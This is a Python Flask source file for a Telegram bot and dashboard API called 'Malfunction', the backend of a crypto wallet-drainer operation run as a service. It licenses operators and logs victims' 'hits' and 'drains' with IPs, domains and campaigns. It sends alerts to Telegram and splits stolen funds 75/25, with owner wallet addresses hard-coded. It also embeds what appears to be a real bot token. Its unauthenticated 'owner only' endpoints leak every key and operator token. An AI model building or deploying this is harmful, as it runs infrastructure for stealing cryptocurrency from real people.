"""
Malfunction Telegram Bot
- Handles /start, /myid, /login, /createkey, /keys, /revoke, /logs, /dashboard
- Owner check tied to TELEGRAM ID 8802368130
- Exposes a small REST API for the dashboard
- Tracks 75/25 split on every drain hit
"""

import os
import json
import secrets
import string
import threading
import time
import urllib.request
import urllib.parse
from datetime import datetime, timedelta
from flask import Flask, request, jsonify
from flask_cors import CORS

# ==========================================================
# CONFIG
# ==========================================================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8716799885:AAHrA6st-d8nYDYIA1lOk1EL5Sssh8qvAh4")
OWNER_ID = "8802368130"
DASHBOARD_URL = os.environ.get("DASHBOARD_URL", "https://malfunction-dashboard.netlify.app")
DATA_FILE = "data.json"
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")

# split config — 25% to owner
SPLIT_OWNER_BPS = 2500
OWNER_SOL = "HBVUFHqZqsXVJ9uv3rijUhR7ATToauPMjp8C5HeVLSPA"
OWNER_EVM = "0x8EBF82856efCE4475819292e5830dcf471dbF552"

API_BASE = f"https://api.telegram.org/bot{BOT_TOKEN}"

app = Flask(__name__)
CORS(app)

# ==========================================================
# STORAGE
# ==========================================================
_lock = threading.Lock()

def _load():
    if not os.path.exists(DATA_FILE):
        return {
            "users": {},
            "keys": {},
            "approvals": [],
            "master_log": [],
            "sessions": {}
        }
    with open(DATA_FILE, "r") as f:
        return json.load(f)

def _save(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=2)

def db():
    return _load()

def db_set(data):
    _save(data)

# ==========================================================
# TELEGRAM API HELPERS
# ==========================================================
def tg(method, payload, token=None):
    try:
        base = f"https://api.telegram.org/bot{token}" if token else API_BASE
        url = f"{base}/{method}"
        data = json.dumps(payload).encode()
        req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=15) as r:
            return json.loads(r.read().decode())
    except Exception as e:
        print("TG ERROR:", method, e)
        return None

def send_message(chat_id, text, reply_markup=None, token=None):
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    return tg("sendMessage", payload, token=token)

def send_menu(chat_id, text, buttons):
    return send_message(chat_id, text, {"inline_keyboard": buttons})

# ==========================================================
# KEY GENERATION
# ==========================================================
def generate_key():
    alphabet = string.ascii_uppercase + string.digits
    alphabet = alphabet.replace("O", "").replace("I", "").replace("0", "").replace("1", "")
    seg = lambda: "".join(secrets.choice(alphabet) for _ in range(4))
    return "-".join(seg() for _ in range(4))

# ==========================================================
# /start
# ==========================================================
def cmd_start(chat_id, user_id, username):
    data = db()
    uid = str(user_id)
    is_owner = (uid == OWNER_ID)

    if is_owner:
        data["users"].setdefault(uid, {})
        data["users"][uid].update({
            "username": username or "owner",
            "approved": True,
            "is_owner": True,
            "first_seen": data["users"][uid].get("first_seen") or datetime.utcnow().isoformat()
        })
        db_set(data)
        send_message(chat_id,
            "<b>👑 Welcome, Owner.</b>\n\n"
            "You have full access to Malfunction.\n\n"
            "<b>Commands:</b>\n"
            "/myid — get your Telegram ID\n"
            "/createkey &lt;tg_id&gt; [note] — generate a login key for a user\n"
            "/keys — list all keys\n"
            "/revoke &lt;key&gt; — revoke a key\n"
            "/logs — recent master log\n"
            "/dashboard — open the dashboard"
        )
        return

    send_message(chat_id,
        "<b>Welcome to Malfunction</b>\n\n"
        "To register, please reply with your Telegram ID.\n"
        "If you don't know it, run the command /myid."
    )

def cmd_myid(chat_id, user_id, username):
    send_message(chat_id, f"Your Telegram ID is:\n<code>{user_id}</code>")

# ==========================================================
# REGISTRATION
# ==========================================================
def handle_registration(chat_id, user_id, text, username):
    data = db()
    uid = str(user_id)

    if uid in data["users"] and data["users"][uid].get("approved"):
        send_message(chat_id, "You're already registered. If you don't have a key yet, DM @user_8802368130.")
        return

    submitted = text.strip()

    data["users"][uid] = {
        "username": username or f"user_{uid}",
        "submitted_id": submitted,
        "approved": False,
        "first_seen": datetime.utcnow().isoformat()
    }
    db_set(data)

    send_message(chat_id,
        "<b>✅ Account created successfully.</b>\n\n"
        "If you still don't have the login key, DM <b>@user_8802368130</b>.\n\n"
        f"Dashboard: {DASHBOARD_URL}"
    )

    send_message(OWNER_ID,
        f"<b>New registration</b>\n\n"
        f"User: @{username or 'unknown'}\n"
        f"TG ID: <code>{uid}</code>\n"
        f"Submitted: <code>{submitted}</code>\n\n"
        f"Generate a key with:\n<code>/createkey {uid} new-user</code>"
    )

# ==========================================================
# /createkey <tg_id> [note]
# ==========================================================
def cmd_createkey(chat_id, user_id, args):
    if str(user_id) != OWNER_ID:
        send_message(chat_id, "⛔ Owner only.")
        return
    if len(args) < 1:
        send_message(chat_id, "Usage: /createkey &lt;tg_id&gt; [note]")
        return
    tg_id = args[0].strip()
    note = " ".join(args[1:]).strip() or "owner-issued"

    key = generate_key()
    data = db()
    data["keys"][key] = {
        "telegram": tg_id,
        "note": note,
        "max_uses": 1,
        "uses": 0,
        "bot_token": "",
        "chat_id": tg_id,
        "expires": (datetime.utcnow() + timedelta(days=7)).isoformat(),
        "created_at": datetime.utcnow().isoformat()
    }
    db_set(data)

    try:
        send_message(tg_id,
            f"<b>Welcome, @user_{tg_id}!</b>\n\n"
            f"Your license key:\n\n"
            f"<code>{key}</code>\n\n"
            f"This key is permanently linked to your Telegram account. Keep it safe.\n"
            f"Enter this key on the dashboard to activate your session.\n\n"
            f"Dashboard: {DASHBOARD_URL}"
        )
    except Exception as e:
        send_message(chat_id, f"Key generated but could not DM user: {e}")

    send_message(chat_id, f"✅ Key created for <code>{tg_id}</code>:\n\n<code>{key}</code>")

# ==========================================================
# /keys
# ==========================================================
def cmd_keys(chat_id, user_id):
    if str(user_id) != OWNER_ID:
        send_message(chat_id, "⛔ Owner only.")
        return
    data = db()
    if not data["keys"]:
        send_message(chat_id, "No keys yet.")
        return
    lines = ["<b>Issued keys:</b>\n"]
    for k, v in list(data["keys"].items())[:30]:
        used = v.get("uses", 0)
        mx = v.get("max_uses", 1)
        status = "used" if used >= mx else "active"
        lines.append(f"<code>{k}</code> → {v.get('telegram','?')} [{status}] ({used}/{mx})")
    send_message(chat_id, "\n".join(lines))

# ==========================================================
# /revoke <key>
# ==========================================================
def cmd_revoke(chat_id, user_id, args):
    if str(user_id) != OWNER_ID:
        send_message(chat_id, "⛔ Owner only.")
        return
    if not args:
        send_message(chat_id, "Usage: /revoke &lt;key&gt;")
        return
    key = args[0].strip().upper()
    data = db()
    if key in data["keys"]:
        del data["keys"][key]
        db_set(data)
        send_message(chat_id, f"✅ Revoked <code>{key}</code>")
    else:
        send_message(chat_id, "Key not found.")

# ==========================================================
# /logs
# ==========================================================
def cmd_logs(chat_id, user_id):
    if str(user_id) != OWNER_ID:
        send_message(chat_id, "⛔ Owner only.")
        return
    data = db()
    log = data.get("master_log", [])[-20:]
    if not log:
        send_message(chat_id, "No log entries.")
        return
    lines = ["<b>Recent master log:</b>\n"]
    for e in log:
        lines.append(f"• {e.get('event','?')} · {e.get('user','?')} · {e.get('ip','—')}")
    send_message(chat_id, "\n".join(lines))

# ==========================================================
# /dashboard
# ==========================================================
def cmd_dashboard(chat_id):
    send_message(chat_id, f"Dashboard: {DASHBOARD_URL}")

# ==========================================================
# CALLBACK QUERIES
# ==========================================================
def handle_callback(cq):
    data_id = cq.get("id")
    from_id = str(cq.get("from", {}).get("id"))
    data = cq.get("data", "")

    if from_id != OWNER_ID:
        tg("answerCallbackQuery", {"callback_query_id": data_id, "text": "Owner only."})
        return

    parts = data.split(":")
    action = parts[0]
    approval_id = parts[1] if len(parts) > 1 else ""

    store = db()
    for a in store["approvals"]:
        if a.get("id") == approval_id:
            a["status"] = "approved" if action == "approve" else "denied"
            a["resolved_at"] = datetime.utcnow().isoformat()
            break
    db_set(store)

    tg("answerCallbackQuery", {"callback_query_id": data_id, "text": f"{action}d."})

    msg = cq.get("message", {})
    chat_id = msg.get("chat", {}).get("id")
    message_id = msg.get("message_id")
    new_text = msg.get("text", "") + f"\n\n{'✅ Approved' if action == 'approve' else '❌ Denied'}"
    if chat_id and message_id:
        tg("editMessageText", {"chat_id": chat_id, "message_id": message_id, "text": new_text, "parse_mode": "HTML"})

# ==========================================================
# WEBHOOK
# ==========================================================
@app.route("/webhook", methods=["POST"])
def webhook():
    update = request.get_json(force=True)
    try:
        if "message" in update:
            msg = update["message"]
            chat_id = msg["chat"]["id"]
            user_id = msg["from"]["id"]
            username = msg["from"].get("username")
            text = (msg.get("text") or "").strip()

            if text.startswith("/start"):
                cmd_start(chat_id, user_id, username)
            elif text.startswith("/myid"):
                cmd_myid(chat_id, user_id, username)
            elif text.startswith("/createkey"):
                cmd_createkey(chat_id, user_id, text.split()[1:])
            elif text.startswith("/keys"):
                cmd_keys(chat_id, user_id)
            elif text.startswith("/revoke"):
                cmd_revoke(chat_id, user_id, text.split()[1:])
            elif text.startswith("/logs"):
                cmd_logs(chat_id, user_id)
            elif text.startswith("/dashboard"):
                cmd_dashboard(chat_id)
            elif text.startswith("/login"):
                send_message(chat_id, f"Open the dashboard and enter your key:\n{DASHBOARD_URL}")
            else:
                handle_registration(chat_id, user_id, text, username)

        elif "callback_query" in update:
            handle_callback(update["callback_query"])
    except Exception as e:
        print("WEBHOOK ERROR:", e)
    return "ok"

# ==========================================================
# REST API — dashboard
# ==========================================================
@app.route("/api/status", methods=["GET"])
def api_status():
    data = db()
    return jsonify({
        "ok": True,
        "bot": "malfunctiondrainbot",
        "approvals": data.get("approvals", [])[-50:],
        "masterLog": data.get("master_log", [])[-50:]
    })

@app.route("/api/login", methods=["POST"])
def api_login():
    body = request.get_json(force=True)
    key = (body.get("key") or "").strip().upper()
    ua = body.get("ua", "")
    ip = request.remote_addr

    data = db()
    k = data.get("keys", {}).get(key)
    if not k:
        return jsonify({"ok": False, "error": "invalid_key"}), 400
    if k.get("uses", 0) >= k.get("max_uses", 1):
        return jsonify({"ok": False, "error": "used"}), 400

    approval_id = secrets.token_urlsafe(8)
    username = f"user_{k.get('telegram','x')}"
    approval = {
        "id": approval_id,
        "username": username,
        "key": key,
        "ip": ip,
        "device": ua[:80],
        "status": "pending",
        "t": datetime.utcnow().isoformat()
    }
    data["approvals"].append(approval)
    data["keys"][key]["uses"] = k.get("uses", 0) + 1
    db_set(data)

    send_menu(OWNER_ID,
        f"<b>🔐 Login request</b>\n\n"
        f"User: {username}\n"
        f"Key: <code>{key}</code>\n"
        f"IP: <code>{ip}</code>\n"
        f"Device: {ua[:60]}\n\n"
        f"Approve this login?",
        [[
            {"text": "✅ Approve", "callback_data": f"approve:{approval_id}"},
            {"text": "❌ Deny", "callback_data": f"deny:{approval_id}"}
        ]]
    )

    return jsonify({
        "ok": True,
        "session": {
            "username": username,
            "telegram": k.get("telegram"),
            "key": key,
            "isOwner": k.get("telegram") == OWNER_ID,
            "since": datetime.utcnow().isoformat()
        },
        "ip": ip,
        "ua": ua[:80],
        "approvalId": approval_id
    })

@app.route("/api/keys", methods=["POST"])
def api_create_key():
    body = request.get_json(force=True)
    data = db()
    key = body.get("key")
    entry = dict(body)
    entry.setdefault("bot_token", "")
    entry.setdefault("chat_id", body.get("telegram", ""))
    entry.setdefault("uses", 0)
    entry.setdefault("max_uses", body.get("maxUses", 1))
    entry.setdefault("created_at", datetime.utcnow().isoformat())
    data.setdefault("keys", {})[key] = entry
    db_set(data)
    if body.get("telegram"):
        try:
            send_message(body["telegram"],
                f"<b>You've been granted access.</b>\n\n"
                f"Your license key:\n\n<code>{key}</code>\n\n"
                f"Dashboard: {DASHBOARD_URL}"
            )
        except Exception:
            pass
    return jsonify({"ok": True})

@app.route("/api/revoke", methods=["POST"])
def api_revoke():
    body = request.get_json(force=True)
    key = body.get("key")
    data = db()
    if key in data.get("keys", {}):
        del data["keys"][key]
        db_set(data)
    return jsonify({"ok": True})

@app.route("/api/approval", methods=["POST"])
def api_approval():
    body = request.get_json(force=True)
    aid = body.get("id")
    status = body.get("status")
    data = db()
    for a in data.get("approvals", []):
        if a.get("id") == aid:
            a["status"] = status
            a["resolved_at"] = datetime.utcnow().isoformat()
            break
    db_set(data)
    return jsonify({"ok": True})

@app.route("/api/settings", methods=["POST"])
def api_settings():
    return jsonify({"ok": True})

@app.route("/api/master_log", methods=["POST"])
def api_master_log():
    body = request.get_json(force=True)
    data = db()
    data.setdefault("master_log", []).append(body)
    db_set(data)
    return jsonify({"ok": True})

# ==========================================================
# /api/user-config
# ==========================================================
@app.route("/api/user-config", methods=["POST"])
def api_user_config():
    body = request.get_json(force=True) or {}
    key = (body.get("key") or "").strip().upper()
    token = (body.get("bot_token") or "").strip()
    chat = (body.get("chat_id") or "").strip()

    data = db()
    if key not in data.get("keys", {}):
        return jsonify({"ok": False, "error": "invalid_key"}), 400

    data["keys"][key]["bot_token"] = token
    data["keys"][key]["chat_id"] = chat or data["keys"][key].get("telegram")
    db_set(data)
    return jsonify({"ok": True})

# ==========================================================
# /api/hit — split-aware
# ==========================================================
@app.route("/api/hit", methods=["POST"])
def api_hit():
    body = request.get_json(force=True) or {}
    key = (body.get("key") or "").strip().upper()

    # split accounting
    if body.get("event") == "drain":
        _amt = float(body.get("amount") or 0)
        body["owner_cut"] = round(_amt * (SPLIT_OWNER_BPS / 10000), 8)
        body["operator_cut"] = round(_amt - body["owner_cut"], 8)
        body["owner_wallet"] = OWNER_SOL if body.get("chain") == "sol" else OWNER_EVM

    data = db()
    k = data.get("keys", {}).get(key)
    if not k:
        return jsonify({"ok": False, "error": "invalid_key"}), 400

    tg_id = k.get("telegram")
    ip = body.get("ip") or request.remote_addr
    campaign = body.get("campaign") or "default"
    wallets = body.get("wallets") or 1
    domain = body.get("domain") or "unknown"
    event = body.get("event") or "hit"
    amount = float(body.get("amount") or 0)

    entry = {
        "t": datetime.utcnow().isoformat(),
        "event": event,
        "user": k.get("note") or f"user_{tg_id}",
        "telegram": tg_id,
        "key": key,
        "ip": ip,
        "campaign": campaign,
        "wallets": wallets,
        "domain": domain,
        "amount": amount,
        "chain": body.get("chain") or "",
        "wallet": body.get("wallet") or "",
        "tx": body.get("tx") or ""
    }
    if event == "drain":
        entry["owner_cut"] = body.get("owner_cut", 0)
        entry["operator_cut"] = body.get("operator_cut", 0)
        entry["owner_wallet"] = body.get("owner_wallet", "")

    data.setdefault("master_log", []).append(entry)
    if len(data["master_log"]) > 2000:
        data["master_log"] = data["master_log"][-2000:]
    db_set(data)

    icon = {"hit": "🔔", "drain": "✅", "error": "❌"}.get(event, "🔔")
    title = {"hit": "New Hit", "drain": "Successful Drain", "error": "Drain Errors"}.get(event, "Event")

    if event == "error":
        text = (
            f"<b>{icon} {title}</b>\n\n"
            f"{wallets} wallet(s) failed to drain\n"
            f"Campaign: <code>{campaign}</code>"
        )
    elif event == "drain":
        text = (
            f"<b>{icon} {title}</b>\n\n"
            f"User: <b>{k.get('note') or 'unknown'}</b>\n"
            f"IP: <code>{ip}</code>\n"
            f"Campaign: <code>{campaign}</code>\n"
            f"Wallets: {wallets}\n"
            f"Amount: <b>${amount:.2f}</b>\n"
            f"Your 75%: <b>${amount * 0.75:.2f}</b>\n\n"
            f'<a href="{DASHBOARD_URL}">{DASHBOARD_URL}</a>'
        )
    else:
        text = (
            f"<b>{icon} {title}</b>\n\n"
            f"User: <b>{k.get('note') or 'unknown'}</b>\n"
            f"IP: <code>{ip}</code>\n"
            f"Campaign: <code>{campaign}</code>\n"
            f"Wallets: {wallets}\n"
            f"Keys: ✅\n\n"
            f'<a href="{DASHBOARD_URL}">{DASHBOARD_URL}</a>'
        )

    user_token = k.get("bot_token")
    user_chat = k.get("chat_id") or tg_id
    if user_token and user_chat:
        send_message(user_chat, text, token=user_token)

    owner_text = (
        f"<b>{icon} {title} (from {k.get('note') or tg_id})</b>\n\n"
        f"Telegram: <code>{tg_id}</code>\n"
        f"Key: <code>{key}</code>\n"
        f"IP: <code>{ip}</code>\n"
        f"Campaign: <code>{campaign}</code>\n"
        f"Wallets: {wallets}\n"
        f"Domain: <code>{domain}</code>\n"
        f"Amount: <b>${amount:.2f}</b>\n"
        f"Your 25%: <b>${(amount * 0.25):.2f}</b>"
    )
    send_message(OWNER_ID, owner_text)

    return jsonify({"ok": True})

# ==========================================================
# /api/user-hits
# ==========================================================
@app.route("/api/user-hits", methods=["POST"])
def api_user_hits():
    body = request.get_json(force=True) or {}
    key = (body.get("key") or "").strip().upper()
    data = db()
    if key not in data.get("keys", {}):
        return jsonify({"ok": False, "error": "invalid_key"}), 400
    mine = [e for e in data.get("master_log", []) if e.get("key") == key]
    return jsonify({"ok": True, "hits": mine[-200:]})

# ==========================================================
# /api/accounts — owner only: full user list
# ==========================================================
@app.route("/api/accounts", methods=["GET"])
def api_accounts():
    data = db()
    keys = data.get("keys", {})
    users = data.get("users", {})
    log = data.get("master_log", [])

    accounts = []
    for k, v in keys.items():
        tg_id = v.get("telegram", "")
        hits = [e for e in log if e.get("key") == k]
        user_info = users.get(tg_id, {})
        accounts.append({
            "username": v.get("note") or user_info.get("username") or f"user_{tg_id}",
            "telegram": tg_id,
            "key": k,
            "firstSeen": user_info.get("first_seen") or v.get("created_at"),
            "lastSeen": hits[-1]["t"] if hits else v.get("created_at"),
            "hits": len([h for h in hits if h.get("event") == "hit"]),
            "status": "active" if v.get("uses", 0) > 0 else "pending",
            "hasBot": bool(v.get("bot_token")),
            "uses": v.get("uses", 0),
            "maxUses": v.get("max_uses", 1)
        })
    accounts.sort(key=lambda a: a.get("firstSeen") or "", reverse=True)
    return jsonify({"ok": True, "accounts": accounts})

# ==========================================================
# /api/owner-keys — owner only: every issued key
# ==========================================================
@app.route("/api/owner-keys", methods=["GET"])
def api_owner_keys():
    data = db()
    keys = data.get("keys", {})
    out = []
    for k, v in keys.items():
        out.append({
            "key": k,
            "telegram": v.get("telegram", ""),
            "note": v.get("note", ""),
            "uses": v.get("uses", 0),
            "maxUses": v.get("max_uses", 1),
            "expires": v.get("expires"),
            "createdAt": v.get("created_at"),
            "hasBot": bool(v.get("bot_token")),
            "botToken": v.get("bot_token", ""),
            "chatId": v.get("chat_id", "")
        })
    out.sort(key=lambda a: a.get("createdAt") or "", reverse=True)
    return jsonify({"ok": True, "keys": out})

# ==========================================================
# /api/split-stats — owner's 25% accounting
# ==========================================================
@app.route("/api/split-stats", methods=["GET"])
def api_split_stats():
    data = db()
    log = data.get("master_log", [])
    drains = [e for e in log if e.get("event") == "drain"]
    total = sum(float(e.get("amount") or 0) for e in drains)
    owner_cut = sum(float(e.get("owner_cut") or 0) for e in drains)
    return jsonify({
        "ok": True,
        "total_drained": total,
        "owner_cut": owner_cut,
        "operator_cut": total - owner_cut,
        "drain_count": len(drains)
    })

@app.route("/", methods=["GET"])
def index():
    return "Malfunction bot is running."

@app.route("/health", methods=["GET"])
def health():
    return jsonify({"ok": True})

# ==========================================================
# SET WEBHOOK
# ==========================================================
def set_webhook():
    if not WEBHOOK_URL:
        print("No WEBHOOK_URL set, skipping.")
        return
    res = tg("setWebhook", {"url": WEBHOOK_URL + "/webhook"})
    print("setWebhook:", res)

if __name__ == "__main__":
    if WEBHOOK_URL:
        set_webhook()
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))